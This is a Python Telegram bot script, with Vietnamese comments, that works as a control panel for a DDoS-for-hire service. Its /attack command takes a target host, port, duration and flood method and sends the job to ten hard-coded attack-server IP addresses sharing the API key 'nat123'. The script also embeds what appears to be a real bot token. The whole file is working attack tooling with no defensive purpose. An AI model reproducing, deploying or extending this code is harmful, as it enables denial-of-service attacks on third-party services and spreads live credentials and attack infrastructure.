import telebot
import time
import requests

bot = telebot.TeleBot("7385532344:AAGqhDHQvpr14NfB4krQV3SLZMUS5I_Ibsc")

allowed_users = []

start_time = time.time()

@bot.message_handler(commands=["attack"])
def attack(message):

    if len(message.text.split()) < 5:
        bot.reply_to(message, 'example: /attack https://goole.com 443 60 flood\n/attack Allow L4 and L7')
        return

    args = message.text.split()
    host = args[1]
    port = args[2]
    time = args[3]
    method = args[4]

    if not all([host, port, time, method]):
        bot.reply_to(message, "example: /attack https://goole.com 443 60 flood\n/attack Allow L4 and L7")
        return

    if int(time) > 299:
        bot.reply_to(message, 'Error Time | Max Time 299s')
        return

    try:
        port = int(port)
    except ValueError:
        bot.reply_to(message, "Error Port")
        return

    # Kiểm tra port
    if port < 1 or port > 65846:
        bot.reply_to(message, "Error Port")
        return

    if method not in ["bypass", "flood", "hydra", "kill", "fivem", "hydra"]:
        bot.reply_to(message, "Error Method")
        return

    bot.reply_to(message, f'Please wait a moment for the request to arrive at the api !')

    api1 = f"http://167.71.209.127:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api2 = f"http://157.245.154.150:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api3 = f"http://167.71.218.202:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api4 = f"http://157.245.145.39:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api5 = f"http://167.71.208.230:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api6 = f"http://167.71.219.94:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api7 = f"http://152.42.230.180:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api8 = f"http://157.245.145.98:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api9 = f"http://152.42.230.171:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    api10 = f"http://143.198.213.121:9998/api/attack?key=nat123&host={host}&port={port}&time={time}&method={method}"
    
    try:
        response1 = requests.get(api1)
        response2 = requests.get(api2)
        response3 = requests.get(api3)
        response4 = requests.get(api4)
        response5 = requests.get(api5)
        response6 = requests.get(api6)
        response7 = requests.get(api7)
        response8 = requests.get(api8)
        response9 = requests.get(api9)
        response10 = requests.get(api10)
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f'Error sending attack: {str(e)}')
        return

    bot.reply_to(message, f'Attack sent to all servers\nMethod: L7\nHost: {host}\nPort: {port}\nTime: {time}')

@bot.message_handler(commands=['method'])
def help(message):
    help_text = '''
• L7
• bypass
• flood
• hydra
• kill
• fivem
• raw
/attack <host> <port> <time> <method>
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['add'])
def add_user(message):
    try:
        user_id = int(message.text.split()[1])  # Lấy ID người dùng từ tin nhắn
        allowed_users.append(user_id)
        bot.reply_to(message, f"Đã thêm ID {user_id} vào danh sách.")
    except (IndexError, ValueError):
        bot.reply_to(message, "Vui lòng nhập ID người dùng.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    try:
        user_id = int(message.text.split()[1])  # Lấy ID người dùng từ tin nhắn
        allowed_users.remove(user_id)
        bot.reply_to(message, f"Đã xóa ID {user_id} khỏi danh sách.")
    except (IndexError, ValueError):
        bot.reply_to(message, "Vui lòng nhập ID người dùng.")
    except ValueError:
        bot.reply_to(message, "ID người dùng không tồn tại trong danh sách.")

@bot.message_handler(commands=['time'])
def uptime(message):
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)

    uptime_minutes, uptime_seconds = divmod(uptime_seconds, 60)
    uptime_hours, uptime_minutes = divmod(uptime_minutes, 60)
    uptime_days, uptime_hours = divmod(uptime_hours, 24)

    uptime_message = f"The bot is up and running :\n"
    if uptime_days > 0:
        uptime_message += f"{uptime_days} Days | "
    if uptime_hours > 0:
        uptime_message += f"{uptime_hours} Hour | "
    if uptime_minutes > 0:
        uptime_message += f"{uptime_minutes} minute | "
    uptime_message += f"{uptime_seconds} second | "

    bot.reply_to(message, uptime_message)

bot.infinity_polling(timeout=60, long_polling_timeout=1)
